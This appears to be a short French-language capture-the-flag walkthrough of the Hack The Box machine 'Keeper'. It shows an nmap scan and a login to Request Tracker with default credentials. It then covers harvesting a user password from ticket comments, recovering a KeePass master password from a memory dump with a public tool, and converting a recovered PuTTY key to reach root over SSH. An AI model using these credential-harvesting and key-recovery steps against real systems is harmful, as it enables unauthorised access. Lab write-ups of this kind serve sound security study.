# Keeper 
```shell
nmap -sV -sC -p- 10.10.11.227
	Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-19 12:56 GMT
	Nmap scan report for 10.10.11.227
	Host is up (0.079s latency).
	Not shown: 65533 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
	|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
	80/tcp open  http    nginx 1.18.0 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# on add tickets.keeper.htb et keeper.htb dans /etc/hosts 
# page de login 
# on cherche defaults password pour rt 4.4.4+dfsg-2ubuntu1 
# root:password
# on search dans menus pour file upload 
# error qui dit souvent que Referer pas authorise, il faut le changer avec keeper.htb au lieu de tickets.keeper.htb
# dans adminpanel et user on a un Inorgaard, dans les comments on a password
# lnorgaard:Welcome2023!
# on recup le zip puis on le dezip 
unzip RT30000.zip
# on a un kdbx (keepass) et un file .dmp
# on search sur google on a une cve pour find master key de keepass
git clone https://github.com/z-jxy/keepass_dump
python3 keepass_dump.py -f KeePassDumpFull.dmp --recover
# on find dgrd med flde
# search sur google on find un plat du danemark cest le mdp 
# rødgrød med fløde
# on find putty key ssh, on doit convertir avec puttygen pour avoir key openssh 
# on copy colle notes de keepass dans file.ppk puis 
puttygen putty.ppk -O private-openssh -o id_rsa
# connexion 
ssh -i id_rsa root@10.10.11.227
# on est root 



```
